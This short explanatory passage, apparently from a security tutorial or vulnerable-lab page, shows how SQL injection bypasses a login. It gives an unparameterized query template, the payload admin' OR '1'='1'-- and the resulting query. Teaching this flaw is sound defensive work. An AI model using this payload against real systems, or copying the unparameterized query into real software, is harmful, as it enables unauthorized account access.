This login uses raw SQL queries without parameterization, making it vulnerable to SQL injection.
How SQL Injection Works

Vulnerable Query:

SELECT * FROM users WHERE username = '{username}' AND password = '{password}'

Attack Payload:

username: admin' OR '1'='1'--
password: anything

Resulting Query:

SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'

Result: The OR '1'='1' condition is always true, and -- comments out the password check, allowing authentication bypass.
